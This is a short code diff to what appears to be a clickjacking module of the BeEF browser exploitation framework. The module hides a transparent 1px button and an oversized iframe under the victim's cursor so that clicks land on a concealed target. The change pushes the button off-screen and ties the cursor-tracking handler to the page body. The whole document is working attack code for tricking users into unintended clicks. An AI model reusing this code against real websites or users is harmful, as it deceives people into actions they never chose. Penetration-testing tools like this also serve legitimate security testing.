@@ -67,7 +67,7 @@ beef.execute(function() {
 		var inner = $j.extend(true, {'border':'none', 'position':'absolute', 'width':'2000px', 'height':'10000px'}, stylesInner);
 
 		var containerDiv = $j('<div id="' + elems.outerFrame + '"></div>').css(container).prependTo('body');
-		var containerDiv = $j('<input id="' + elems.btn + '" type="button" value="invisible" style="width:1px;height:1px;opacity:0;alpha(opacity=0)" />').appendTo('body');
+		var containerDiv = $j('<input id="' + elems.btn + '" type="button" value="invisible" style="width:1px;height:1px;opacity:0;alpha(opacity=0);margin-left:-200px" />').appendTo('body');
 
 		var innerIframe = $j('<iframe id="' + elems.innerFrame + '" scrolling="no" />').attr(params).css(inner).load(callback).prependTo('#' + elems.outerFrame);
 
@@ -80,7 +80,7 @@ beef.execute(function() {
 		var btnObj = $(btnSelector);
 		var outerObj = $(outerSelector);
 
-		$(window).mousemove(function(e) {
+		$("body").mousemove(function(e) {
 			$(outerObj).css('top', e.pageY);
 			$(outerObj).css('left', e.pageX);
 		});
